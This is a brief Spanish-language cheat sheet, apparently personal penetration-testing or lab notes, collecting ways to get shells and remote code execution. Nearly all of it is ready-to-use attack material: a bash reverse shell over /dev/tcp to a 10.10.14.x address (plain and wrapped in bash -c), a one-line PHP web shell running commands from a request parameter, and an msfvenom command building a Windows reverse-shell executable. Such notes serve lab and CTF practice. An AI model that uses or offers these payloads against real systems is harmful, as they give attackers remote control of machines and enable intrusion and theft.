# SHELLs y y RCE
Aqui iremos describiendo las diferentes maneras de crear SHELLs a medida que nos las encontremos.

## LINUX

Diferentes manereas de crear shells en linux.

La manera mas directa de crear una reverse shell en linus es:
<pre>
bash -i >& /dev/tcp/10.10.14.49/443 0>&1
</pre>

Aunque a veces es mejor indicarselo como parámetro:

<pre>
bash -c "bash -i >& /dev/tcp/10.10.14.49/443 0>&1"
</pre>

## PHP

Ejecución de comandos

~~~
  <?php system($_REQUEST["cmd"]); ?>
~~~

## MSFVENOM

### Fichero EXE
<pre>
  msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.51 LPORT=443 -f exe -o reverse.exe
</pre>
